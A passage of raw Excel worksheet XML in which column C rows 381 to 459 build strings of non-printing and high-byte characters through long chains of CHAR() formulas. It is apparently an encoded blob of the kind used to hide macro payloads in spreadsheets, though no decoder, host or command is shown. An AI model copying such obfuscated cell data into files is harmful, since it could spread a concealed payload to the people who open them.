        <f>CHAR(186)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(223)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(222)&amp;CHAR(187)&amp;CHAR(249)</f>
        <v>ºë÷ßô6ÍÞ»ù</v>
      </c>
    </row>
    <row r="382" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C382" t="str">
        <f>CHAR(247)&amp;CHAR(241)&amp;CHAR(244)&amp;CHAR(60)&amp;CHAR(204)&amp;CHAR(251)&amp;CHAR(187)&amp;CHAR(220)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>÷ñô&lt;Ìû»Ü÷ý</v>
      </c>
    </row>
    <row r="383" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C383" t="str">
        <f>CHAR(244)&amp;CHAR(15)&amp;CHAR(205)&amp;CHAR(207)&amp;CHAR(187)&amp;CHAR(231)&amp;CHAR(247)&amp;CHAR(247)&amp;CHAR(245)&amp;CHAR(38)</f>
        <v>ô_x000F_ÍÏ»ç÷÷õ&amp;</v>
      </c>
    </row>
    <row r="384" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C384" t="str">
        <f>CHAR(205)&amp;CHAR(160)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(196)&amp;CHAR(244)&amp;CHAR(30)&amp;CHAR(205)&amp;CHAR(231)</f>
        <v>Í »ë÷Äô_x001E_Íç</v>
      </c>
    </row>
    <row r="385" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C385" t="str">
        <f>CHAR(187)&amp;CHAR(233)&amp;CHAR(246)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(97)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(222)</f>
        <v>»éöýôaÍë»Þ</v>
      </c>
    </row>
    <row r="386" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C386" t="str">
        <f>CHAR(247)&amp;CHAR(199)&amp;CHAR(244)&amp;CHAR(58)&amp;CHAR(205)&amp;CHAR(107)&amp;CHAR(186)&amp;CHAR(251)&amp;CHAR(247)&amp;CHAR(144)</f>
        <v>÷Çô:Íkºû÷</v>
      </c>
    </row>
    <row r="387" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C387" t="str">
        <f>CHAR(240)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(198)&amp;CHAR(187)&amp;CHAR(175)&amp;CHAR(247)&amp;CHAR(241)&amp;CHAR(244)&amp;CHAR(61)</f>
        <v>ð6ÍÆ»¯÷ñô=</v>
      </c>
    </row>
    <row r="388" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C388" t="str">
        <f>CHAR(204)&amp;CHAR(251)&amp;CHAR(187)&amp;CHAR(103)&amp;CHAR(243)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(15)&amp;CHAR(205)&amp;CHAR(174)</f>
        <v>Ìû»góýô_x000F_Í®</v>
      </c>
    </row>
    <row r="389" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C389" t="str">
        <f>CHAR(187)&amp;CHAR(231)&amp;CHAR(247)&amp;CHAR(236)&amp;CHAR(244)&amp;CHAR(90)&amp;CHAR(205)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(250)</f>
        <v>»ç÷ìôZÍê»ú</v>
      </c>
    </row>
    <row r="390" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C390" t="str">
        <f>CHAR(247)&amp;CHAR(138)&amp;CHAR(244)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(250)&amp;CHAR(187)&amp;CHAR(98)&amp;CHAR(247)&amp;CHAR(252)</f>
        <v>÷Šô7Íú»b÷ü</v>
      </c>
    </row>
    <row r="391" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C391" t="str">
        <f>CHAR(244)&amp;CHAR(48)&amp;CHAR(203)&amp;CHAR(143)&amp;CHAR(187)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(171)&amp;CHAR(116)&amp;CHAR(174)</f>
        <v>ô0Ë»ê÷«t®</v>
      </c>
    </row>
    <row r="392" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C392" t="str">
        <f>CHAR(205)&amp;CHAR(236)&amp;CHAR(187)&amp;CHAR(189)&amp;CHAR(119)&amp;CHAR(97)&amp;CHAR(244)&amp;CHAR(49)&amp;CHAR(205)&amp;CHAR(189)</f>
        <v>Íì»½waô1Í½</v>
      </c>
    </row>
    <row r="393" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C393" t="str">
        <f>CHAR(59)&amp;CHAR(77)&amp;CHAR(247)&amp;CHAR(250)&amp;CHAR(244)&amp;CHAR(96)&amp;CHAR(77)&amp;CHAR(88)&amp;CHAR(187)&amp;CHAR(236)</f>
        <v>;M÷úô`MX»ì</v>
      </c>
    </row>
    <row r="394" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C394" t="str">
        <f>CHAR(247)&amp;CHAR(171)&amp;CHAR(116)&amp;CHAR(252)&amp;CHAR(205)&amp;CHAR(236)&amp;CHAR(187)&amp;CHAR(189)&amp;CHAR(119)&amp;CHAR(33)</f>
        <v>÷«tüÍì»½w!</v>
      </c>
    </row>
    <row r="395" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C395" t="str">
        <f>CHAR(244)&amp;CHAR(49)&amp;CHAR(205)&amp;CHAR(189)&amp;CHAR(59)&amp;CHAR(4)&amp;CHAR(247)&amp;CHAR(250)&amp;CHAR(244)&amp;CHAR(96)</f>
        <v>ô1Í½;_x0004_÷úô`</v>
      </c>
    </row>
    <row r="396" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C396" t="str">
        <f>CHAR(77)&amp;CHAR(20)&amp;CHAR(187)&amp;CHAR(236)&amp;CHAR(247)&amp;CHAR(171)&amp;CHAR(116)&amp;CHAR(59)&amp;CHAR(204)&amp;CHAR(236)</f>
        <v>M_x0014_»ì÷«t;Ìì</v>
      </c>
    </row>
    <row r="397" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C397" t="str">
        <f>CHAR(187)&amp;CHAR(189)&amp;CHAR(119)&amp;CHAR(235)&amp;CHAR(245)&amp;CHAR(49)&amp;CHAR(205)&amp;CHAR(189)&amp;CHAR(59)&amp;CHAR(206)</f>
        <v>»½wëõ1Í½;Î</v>
      </c>
    </row>
    <row r="398" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C398" t="str">
        <f>CHAR(246)&amp;CHAR(250)&amp;CHAR(244)&amp;CHAR(96)&amp;CHAR(77)&amp;CHAR(221)&amp;CHAR(186)&amp;CHAR(236)&amp;CHAR(247)&amp;CHAR(171)</f>
        <v>öúô`MÝºì÷«</v>
      </c>
    </row>
    <row r="399" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C399" t="str">
        <f>CHAR(116)&amp;CHAR(120)&amp;CHAR(204)&amp;CHAR(236)&amp;CHAR(187)&amp;CHAR(237)&amp;CHAR(241)&amp;CHAR(153)&amp;CHAR(244)&amp;CHAR(55)</f>
        <v>txÌì»íñ™ô7</v>
      </c>
    </row>
    <row r="400" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C400" t="str">
        <f>CHAR(205)&amp;CHAR(189)&amp;CHAR(59)&amp;CHAR(177)&amp;CHAR(246)&amp;CHAR(246)&amp;CHAR(244)&amp;CHAR(96)&amp;CHAR(77)&amp;CHAR(143)</f>
        <v>Í½;±ööô`M</v>
      </c>
    </row>
    <row r="401" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C401" t="str">
        <f>CHAR(186)&amp;CHAR(224)&amp;CHAR(247)&amp;CHAR(171)&amp;CHAR(116)&amp;CHAR(72)&amp;CHAR(204)&amp;CHAR(224)&amp;CHAR(187)&amp;CHAR(189)</f>
        <v>ºà÷«tHÌà»½</v>
      </c>
    </row>
    <row r="402" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C402" t="str">
        <f>CHAR(119)&amp;CHAR(101)&amp;CHAR(245)&amp;CHAR(61)&amp;CHAR(205)&amp;CHAR(189)&amp;CHAR(59)&amp;CHAR(64)&amp;CHAR(246)&amp;CHAR(246)</f>
        <v>weõ=Í½;@öö</v>
      </c>
    </row>
    <row r="403" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C403" t="str">
        <f>CHAR(244)&amp;CHAR(96)&amp;CHAR(77)&amp;CHAR(47)&amp;CHAR(186)&amp;CHAR(224)&amp;CHAR(247)&amp;CHAR(171)&amp;CHAR(116)&amp;CHAR(227)</f>
        <v>ô`M/ºà÷«tã</v>
      </c>
    </row>
    <row r="404" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C404" t="str">
        <f>CHAR(204)&amp;CHAR(224)&amp;CHAR(187)&amp;CHAR(189)&amp;CHAR(119)&amp;CHAR(19)&amp;CHAR(245)&amp;CHAR(61)&amp;CHAR(205)&amp;CHAR(189)</f>
        <v>Ìà»½w_x0013_õ=Í½</v>
      </c>
    </row>
    <row r="405" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C405" t="str">
        <f>CHAR(59)&amp;CHAR(228)&amp;CHAR(245)&amp;CHAR(246)&amp;CHAR(244)&amp;CHAR(96)&amp;CHAR(77)&amp;CHAR(204)&amp;CHAR(185)&amp;CHAR(224)</f>
        <v>;äõöô`MÌ¹à</v>
      </c>
    </row>
    <row r="406" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C406" t="str">
        <f>CHAR(247)&amp;CHAR(171)&amp;CHAR(116)&amp;CHAR(11)&amp;CHAR(207)&amp;CHAR(224)&amp;CHAR(187)&amp;CHAR(189)&amp;CHAR(119)&amp;CHAR(179)</f>
        <v>÷«t_x000B_Ïà»½w³</v>
      </c>
    </row>
    <row r="407" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C407" t="str">
        <f>CHAR(246)&amp;CHAR(61)&amp;CHAR(205)&amp;CHAR(189)&amp;CHAR(59)&amp;CHAR(130)&amp;CHAR(245)&amp;CHAR(246)&amp;CHAR(244)&amp;CHAR(96)</f>
        <v>ö=Í½;‚õöô`</v>
      </c>
    </row>
    <row r="408" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C408" t="str">
        <f>CHAR(77)&amp;CHAR(106)&amp;CHAR(185)&amp;CHAR(224)&amp;CHAR(247)&amp;CHAR(171)&amp;CHAR(116)&amp;CHAR(185)&amp;CHAR(207)&amp;CHAR(224)</f>
        <v>Mj¹à÷«t¹Ïà</v>
      </c>
    </row>
    <row r="409" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C409" t="str">
        <f>CHAR(187)&amp;CHAR(189)&amp;CHAR(119)&amp;CHAR(93)&amp;CHAR(246)&amp;CHAR(61)&amp;CHAR(205)&amp;CHAR(189)&amp;CHAR(59)&amp;CHAR(86)</f>
        <v>»½w]ö=Í½;V</v>
      </c>
    </row>
    <row r="410" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C410" t="str">
        <f>CHAR(245)&amp;CHAR(246)&amp;CHAR(244)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(62)&amp;CHAR(185)&amp;CHAR(228)&amp;CHAR(247)&amp;CHAR(251)</f>
        <v>õöô0Í&gt;¹ä÷û</v>
      </c>
    </row>
    <row r="411" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C411" t="str">
        <f>CHAR(244)&amp;CHAR(232)&amp;CHAR(207)&amp;CHAR(228)&amp;CHAR(187)&amp;CHAR(237)&amp;CHAR(247)&amp;CHAR(27)&amp;CHAR(246)&amp;CHAR(55)</f>
        <v>ôèÏä»í÷_x001B_ö7</v>
      </c>
    </row>
    <row r="412" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C412" t="str">
        <f>CHAR(205)&amp;CHAR(237)&amp;CHAR(187)&amp;CHAR(25)&amp;CHAR(245)&amp;CHAR(252)&amp;CHAR(244)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(22)</f>
        <v>Íí»_x0019_õüô0Í_x0016_</v>
      </c>
    </row>
    <row r="413" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C413" t="str">
        <f>CHAR(185)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(251)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(206)&amp;CHAR(249)&amp;CHAR(187)&amp;CHAR(237)</f>
        <v>¹ê÷ûô6Îù»í</v>
      </c>
    </row>
    <row r="414" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C414" t="str">
        <f>CHAR(247)&amp;CHAR(246)&amp;CHAR(247)&amp;CHAR(36)&amp;CHAR(205)&amp;CHAR(237)&amp;CHAR(187)&amp;CHAR(254)&amp;CHAR(244)&amp;CHAR(239)</f>
        <v>÷ö÷$Íí»þôï</v>
      </c>
    </row>
    <row r="415" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C415" t="str">
        <f>CHAR(244)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(246)&amp;CHAR(184)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(251)&amp;CHAR(244)&amp;CHAR(23)</f>
        <v>ô0Íö¸ê÷ûô_x0017_</v>
      </c>
    </row>
    <row r="416" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C416" t="str">
        <f>CHAR(206)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(237)&amp;CHAR(247)&amp;CHAR(216)&amp;CHAR(247)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(237)</f>
        <v>Îê»í÷Ø÷7Íí</v>
      </c>
    </row>
    <row r="417" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C417" t="str">
        <f>CHAR(187)&amp;CHAR(198)&amp;CHAR(244)&amp;CHAR(252)&amp;CHAR(244)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(222)&amp;CHAR(184)&amp;CHAR(234)</f>
        <v>»Æôüô0ÍÞ¸ê</v>
      </c>
    </row>
    <row r="418" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C418" t="str">
        <f>CHAR(247)&amp;CHAR(251)&amp;CHAR(244)&amp;CHAR(117)&amp;CHAR(206)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(237)&amp;CHAR(247)&amp;CHAR(172)</f>
        <v>÷ûôuÎê»í÷¬</v>
      </c>
    </row>
    <row r="419" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C419" t="str">
        <f>CHAR(247)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(237)&amp;CHAR(187)&amp;CHAR(138)&amp;CHAR(244)&amp;CHAR(252)&amp;CHAR(244)&amp;CHAR(48)</f>
        <v>÷7Íí»Šôüô0</v>
      </c>
    </row>
    <row r="420" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C420" t="str">
        <f>CHAR(205)&amp;CHAR(130)&amp;CHAR(184)&amp;CHAR(254)&amp;CHAR(247)&amp;CHAR(251)&amp;CHAR(244)&amp;CHAR(67)&amp;CHAR(206)&amp;CHAR(254)</f>
        <v>Í‚¸þ÷ûôCÎþ</v>
      </c>
    </row>
    <row r="421" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C421" t="str">
        <f>CHAR(187)&amp;CHAR(237)&amp;CHAR(247)&amp;CHAR(124)&amp;CHAR(247)&amp;CHAR(57)&amp;CHAR(205)&amp;CHAR(237)&amp;CHAR(187)&amp;CHAR(102)</f>
        <v>»í÷|÷9Íí»f</v>
      </c>
    </row>
    <row r="422" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C422" t="str">
        <f>CHAR(244)&amp;CHAR(242)&amp;CHAR(244)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(124)&amp;CHAR(184)&amp;CHAR(228)&amp;CHAR(247)&amp;CHAR(251)</f>
        <v>ôòô0Í|¸ä÷û</v>
      </c>
    </row>
    <row r="423" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C423" t="str">
        <f>CHAR(244)&amp;CHAR(148)&amp;CHAR(206)&amp;CHAR(228)&amp;CHAR(187)&amp;CHAR(237)&amp;CHAR(241)&amp;CHAR(153)&amp;CHAR(244)&amp;CHAR(50)</f>
        <v>ô”Îä»íñ™ô2</v>
      </c>
    </row>
    <row r="424" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C424" t="str">
        <f>CHAR(205)&amp;CHAR(189)&amp;CHAR(59)&amp;CHAR(71)&amp;CHAR(244)&amp;CHAR(229)&amp;CHAR(244)&amp;CHAR(96)&amp;CHAR(77)&amp;CHAR(93)</f>
        <v>Í½;Gôåô`M]</v>
      </c>
    </row>
    <row r="425" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C425" t="str">
        <f>CHAR(184)&amp;CHAR(243)&amp;CHAR(247)&amp;CHAR(171)&amp;CHAR(116)&amp;CHAR(243)&amp;CHAR(206)&amp;CHAR(243)&amp;CHAR(187)&amp;CHAR(189)</f>
        <v>¸ó÷«tóÎó»½</v>
      </c>
    </row>
    <row r="426" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C426" t="str">
        <f>CHAR(119)&amp;CHAR(44)&amp;CHAR(247)&amp;CHAR(46)&amp;CHAR(205)&amp;CHAR(189)&amp;CHAR(59)&amp;CHAR(54)&amp;CHAR(244)&amp;CHAR(229)</f>
        <v>w,÷.Í½;6ôå</v>
      </c>
    </row>
    <row r="427" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C427" t="str">
        <f>CHAR(244)&amp;CHAR(96)&amp;CHAR(77)&amp;CHAR(6)&amp;CHAR(184)&amp;CHAR(243)&amp;CHAR(247)&amp;CHAR(171)&amp;CHAR(116)&amp;CHAR(201)</f>
        <v>ô`M_x0006_¸ó÷«tÉ</v>
      </c>
    </row>
    <row r="428" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C428" t="str">
        <f>CHAR(206)&amp;CHAR(243)&amp;CHAR(187)&amp;CHAR(189)&amp;CHAR(119)&amp;CHAR(237)&amp;CHAR(240)&amp;CHAR(46)&amp;CHAR(205)&amp;CHAR(189)</f>
        <v>Îó»½wíð.Í½</v>
      </c>
    </row>
    <row r="429" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C429" t="str">
        <f>CHAR(59)&amp;CHAR(247)&amp;CHAR(243)&amp;CHAR(229)&amp;CHAR(244)&amp;CHAR(5)&amp;CHAR(204)&amp;CHAR(112)&amp;CHAR(191)&amp;CHAR(206)</f>
        <v>;÷óåô_x0005_Ìp¿Î</v>
      </c>
    </row>
    <row r="430" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C430" t="str">
        <f>CHAR(247)&amp;CHAR(165)&amp;CHAR(212)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(109)&amp;CHAR(239)&amp;CHAR(166)</f>
        <v>÷¥Ô6Íë»mï¦</v>
      </c>
    </row>
    <row r="431" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C431" t="str">
        <f>CHAR(240)&amp;CHAR(42)&amp;CHAR(205)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(139)&amp;CHAR(215)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ð*Íê»‹×ýô6</v>
      </c>
    </row>
    <row r="432" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C432" t="str">
        <f>CHAR(205)&amp;CHAR(125)&amp;CHAR(187)&amp;CHAR(120)&amp;CHAR(240)&amp;CHAR(82)&amp;CHAR(244)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(235)</f>
        <v>Í}»xðRô7Íë</v>
      </c>
    </row>
    <row r="433" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C433" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(125)&amp;CHAR(244)&amp;CHAR(160)&amp;CHAR(237)&amp;CHAR(65)&amp;CHAR(190)&amp;CHAR(34)</f>
        <v>»ë÷}ô íA¾"</v>
      </c>
    </row>
    <row r="434" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C434" t="str">
        <f>CHAR(247)&amp;CHAR(252)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(107)&amp;CHAR(247)&amp;CHAR(107)</f>
        <v>÷üô6Íë»k÷k</v>
      </c>
    </row>
    <row r="435" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C435" t="str">
        <f>CHAR(212)&amp;CHAR(215)&amp;CHAR(200)&amp;CHAR(58)&amp;CHAR(187)&amp;CHAR(239)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>Ô×È:»ï÷ýô6</v>
      </c>
    </row>
    <row r="436" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C436" t="str">
        <f>CHAR(205)&amp;CHAR(107)&amp;CHAR(187)&amp;CHAR(125)&amp;CHAR(215)&amp;CHAR(213)&amp;CHAR(242)&amp;CHAR(234)&amp;CHAR(205)&amp;CHAR(226)</f>
        <v>Ík»}×ÕòêÍâ</v>
      </c>
    </row>
    <row r="437" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C437" t="str">
        <f>CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(182)&amp;CHAR(205)&amp;CHAR(125)&amp;CHAR(155)&amp;CHAR(168)</f>
        <v>»ë÷ýô¶Í}›¨</v>
      </c>
    </row>
    <row r="438" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C438" t="str">
        <f>CHAR(241)&amp;CHAR(30)&amp;CHAR(244)&amp;CHAR(58)&amp;CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(125)</f>
        <v>ñ_x001E_ô:Íë»ë÷}</v>
      </c>
    </row>
    <row r="439" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C439" t="str">
        <f>CHAR(244)&amp;CHAR(167)&amp;CHAR(237)&amp;CHAR(149)&amp;CHAR(189)&amp;CHAR(7)&amp;CHAR(247)&amp;CHAR(236)&amp;CHAR(244)&amp;CHAR(54)</f>
        <v>ô§í•½_x0007_÷ìô6</v>
      </c>
    </row>
    <row r="440" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C440" t="str">
        <f>CHAR(205)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(107)&amp;CHAR(247)&amp;CHAR(107)&amp;CHAR(212)&amp;CHAR(201)&amp;CHAR(205)&amp;CHAR(29)</f>
        <v>Íë»k÷kÔÉÍ_x001D_</v>
      </c>
    </row>
    <row r="441" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C441" t="str">
        <f>CHAR(187)&amp;CHAR(253)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(107)&amp;CHAR(187)&amp;CHAR(125)</f>
        <v>»ý÷ýô6Ík»}</v>
      </c>
    </row>
    <row r="442" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C442" t="str">
        <f>CHAR(215)&amp;CHAR(171)&amp;CHAR(243)&amp;CHAR(63)&amp;CHAR(204)&amp;CHAR(203)&amp;CHAR(187)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)</f>
        <v>×«ó?ÌË»ë÷ý</v>
      </c>
    </row>
    <row r="443" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C443" t="str">
        <f>CHAR(244)&amp;CHAR(182)&amp;CHAR(205)&amp;CHAR(125)&amp;CHAR(155)&amp;CHAR(136)&amp;CHAR(240)&amp;CHAR(244)&amp;CHAR(245)&amp;CHAR(23)</f>
        <v>ô¶Í}›ˆðôõ_x0017_</v>
      </c>
    </row>
    <row r="444" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C444" t="str">
        <f>CHAR(205)&amp;CHAR(128)&amp;CHAR(154)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(167)&amp;CHAR(213)&amp;CHAR(115)</f>
        <v>Í€šë÷ýô§Õs</v>
      </c>
    </row>
    <row r="445" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C445" t="str">
        <f>CHAR(188)&amp;CHAR(68)&amp;CHAR(247)&amp;CHAR(223)&amp;CHAR(244)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(41)</f>
        <v>¼D÷ßô6Íê»)</v>
      </c>
    </row>
    <row r="446" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C446" t="str">
        <f>CHAR(242)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(57)&amp;CHAR(190)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(254)</f>
        <v>òýô4Í9¾ë÷þ</v>
      </c>
    </row>
    <row r="447" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C447" t="str">
        <f>CHAR(244)&amp;CHAR(196)&amp;CHAR(207)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(40)&amp;CHAR(246)&amp;CHAR(54)</f>
        <v>ôÄÏë»ê÷(ö6</v>
      </c>
    </row>
    <row r="448" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C448" t="str">
        <f>CHAR(205)&amp;CHAR(233)&amp;CHAR(187)&amp;CHAR(31)&amp;CHAR(242)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(53)&amp;CHAR(205)&amp;CHAR(233)</f>
        <v>Íé»_x001F_òýô5Íé</v>
      </c>
    </row>
    <row r="449" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C449" t="str">
        <f>CHAR(189)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(249)&amp;CHAR(244)&amp;CHAR(61)&amp;CHAR(203)&amp;CHAR(233)&amp;CHAR(187)&amp;CHAR(238)</f>
        <v>½ë÷ùô=Ëé»î</v>
      </c>
    </row>
    <row r="450" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C450" t="str">
        <f>CHAR(247)&amp;CHAR(236)&amp;CHAR(242)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(222)&amp;CHAR(241)&amp;CHAR(253)</f>
        <v>÷ìò6Íê»Þñý</v>
      </c>
    </row>
    <row r="451" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C451" t="str">
        <f>CHAR(244)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(53)&amp;CHAR(185)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(254)&amp;CHAR(244)&amp;CHAR(10)</f>
        <v xml:space="preserve">ô4Í5¹ë÷þô
</v>
      </c>
    </row>
    <row r="452" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C452" t="str">
        <f>CHAR(203)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(234)&amp;CHAR(247)&amp;CHAR(40)&amp;CHAR(246)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(233)</f>
        <v>Ëë»ê÷(ö6Íé</v>
      </c>
    </row>
    <row r="453" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C453" t="str">
        <f>CHAR(187)&amp;CHAR(185)&amp;CHAR(241)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(53)&amp;CHAR(205)&amp;CHAR(183)&amp;CHAR(189)&amp;CHAR(235)</f>
        <v>»¹ñýô5Í·½ë</v>
      </c>
    </row>
    <row r="454" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C454" t="str">
        <f>CHAR(247)&amp;CHAR(249)&amp;CHAR(244)&amp;CHAR(85)&amp;CHAR(203)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(238)&amp;CHAR(247)&amp;CHAR(137)</f>
        <v>÷ùôUËë»î÷‰</v>
      </c>
    </row>
    <row r="455" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C455" t="str">
        <f>CHAR(242)&amp;CHAR(54)&amp;CHAR(205)&amp;CHAR(234)&amp;CHAR(187)&amp;CHAR(62)&amp;CHAR(245)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(52)</f>
        <v>ò6Íê»&gt;õýô4</v>
      </c>
    </row>
    <row r="456" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C456" t="str">
        <f>CHAR(205)&amp;CHAR(185)&amp;CHAR(189)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(254)&amp;CHAR(244)&amp;CHAR(106)&amp;CHAR(203)&amp;CHAR(235)</f>
        <v>Í¹½ë÷þôjËë</v>
      </c>
    </row>
    <row r="457" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C457" t="str">
        <f>CHAR(187)&amp;CHAR(239)&amp;CHAR(247)&amp;CHAR(114)&amp;CHAR(242)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(238)&amp;CHAR(187)&amp;CHAR(119)</f>
        <v>»ï÷rò4Íî»w</v>
      </c>
    </row>
    <row r="458" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C458" t="str">
        <f>CHAR(241)&amp;CHAR(253)&amp;CHAR(244)&amp;CHAR(55)&amp;CHAR(205)&amp;CHAR(64)&amp;CHAR(189)&amp;CHAR(235)&amp;CHAR(247)&amp;CHAR(255)</f>
        <v>ñýô7Í@½ë÷ÿ</v>
      </c>
    </row>
    <row r="459" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C459" t="str">
        <f>CHAR(244)&amp;CHAR(139)&amp;CHAR(203)&amp;CHAR(235)&amp;CHAR(187)&amp;CHAR(232)&amp;CHAR(247)&amp;CHAR(54)&amp;CHAR(242)&amp;CHAR(54)</f>
        <v>ô‹Ëë»è÷6ò6</v>
      </c>
    </row>
